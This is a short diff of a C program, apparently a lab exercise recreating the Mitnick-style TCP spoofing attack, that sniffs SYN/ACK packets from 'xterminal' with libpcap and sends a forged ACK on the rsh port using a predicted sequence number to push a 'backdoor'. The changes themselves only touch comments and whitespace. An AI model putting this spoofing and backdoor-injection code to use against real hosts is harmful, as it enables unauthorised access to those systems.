@@ -128,7 +128,7 @@ int main (void)
 	char *dev;																		// The device to sniff, eth0?
 	char errbuf[PCAP_ERRBUF_SIZE];								// Error string
 	struct bpf_program fp;												// The compiled filter
-	char filter_exp[] = "src host xterminal and (tcp[tcpflags] & (tcp-syn | tcp-ack) != 0)";			// The filter expression, only packets that I receive from xterminal
+	char filter_exp[] = "src host xterminal and (tcp[tcpflags] & (tcp-syn | tcp-ack) != 0)";		 //only get syn ack from xterminal
 	bpf_u_int32 mask;															// Netmask
 	bpf_u_int32 net;															// kevin IP
 	struct pcap_pkthdr header;										// pcap header
@@ -136,6 +136,7 @@ int main (void)
 	//const struct ip_hdr *ip_hdr;
 	const struct tcp_hdr *tcp_hdr;
 
+	//from libpcap documentation
 	/* Define the device */
 	dev = pcap_lookupdev(errbuf);
 	if (dev == NULL)
@@ -231,7 +232,7 @@ int main (void)
 	send_ack(514, 514, (uint8_t *) backdoor, b_len, l, server_ip, xterm_ip, my_seq + 1,  predicted_seq);
 	printf("sent ack and pushed backdoor\n\n");
 
-	
+
 
 	exit(EXIT_SUCCESS);
 }
